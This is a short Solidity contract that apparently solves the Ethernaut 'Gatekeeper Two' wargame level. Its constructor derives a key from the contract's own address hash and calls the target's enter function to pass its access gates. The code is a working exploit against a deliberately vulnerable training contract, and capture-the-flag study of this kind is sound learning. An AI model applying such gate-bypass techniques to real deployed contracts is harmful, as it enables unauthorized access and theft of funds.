// SPDX-License-Identifier: MIT
// instance 0xBE7227dc98Ef59fc7B672d27f8C7ad2d7B193705
pragma solidity ^0.6.0;
// import './GateKeeperTwo.sol';

contract GateKeeperTwoAttack {

    // GateKeeperTwo target;

    constructor(address _targetAddress) public {

        bytes8 _key = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ uint64(0) - 1);
        _targetAddress.call(abi.encodeWithSignature('enter(bytes8)', _key));


    }

}